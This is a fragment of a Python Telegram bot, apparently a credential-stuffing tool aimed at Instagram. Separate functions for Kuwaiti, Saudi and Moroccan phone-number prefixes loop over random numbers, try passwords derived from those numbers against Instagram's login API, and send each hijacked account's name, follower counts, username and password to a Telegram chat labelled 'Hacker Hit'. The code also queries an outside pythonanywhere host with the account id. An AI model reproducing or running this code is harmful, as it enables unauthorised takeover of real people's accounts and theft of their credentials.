		us = str(''.join((random.choice(user) for i in range(5))))
		username = '+965690' + us
		password = '690' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_TOP = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_TOP}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			ali=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={ali}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
⌯ 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚘𝚘𝚕𝚜 TUPAC 🐉🔥 ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
⌯ 𝚄𝚂𝙴𝚁 : [ {user_TOP} ] ⌯
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_TOP} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
⌯ ᴘᴀѕѕ : [ {password} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙲𝙷 : [ @OYOYV ] ⌯    
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='TOP')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='TOP1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='TOP2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='TOP3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*تم تفعيل الادة الان انتظر الصيد 🐺 *",parse_mode = "markdown",reply_markup=o)
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
def SAUDIA(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321') 
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+96655' + us
		password = '055' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_TOP = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_TOP}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			ali=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={ali}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
⌯ 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚘𝚘𝚕𝚜 TUPAC 🐉🔥 ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
⌯ 𝚄𝚂𝙴𝚁 : [ {user_TOP} ] ⌯
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_TOP} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
⌯ ᴘᴀѕѕ : [ {password} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙲𝙷 : [ @OYOYV ] ⌯    
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='TOP')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='TOP1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='TOP2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='TOP3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*تم تفعيل الادة الان انتظر الصيد 🐺 *",parse_mode = "markdown",reply_markup=o) 
#
#

#
#
#
#
#
#
#
#
#
#
#
def Morocco(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(8))))
		username = '+2126' + us
		password = '06' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_TOP = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_TOP}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			ali=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={ali}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
⌯ 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚘𝚘𝚕𝚜 TUPAC 🐉🔥 ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
⌯ 𝚄𝚂𝙴𝚁 : [ {user_TOP} ] ⌯
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_TOP} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
⌯ ᴘᴀѕѕ : [ {password} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙲𝙷 : [ @OYOYV ] ⌯    
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='TOP')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='TOP1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='TOP2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='TOP3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*تم تفعيل الادة الان انتظر الصيد 🐺 *",parse_mode = "markdown",reply_markup=o) 

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://sidrabot.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))

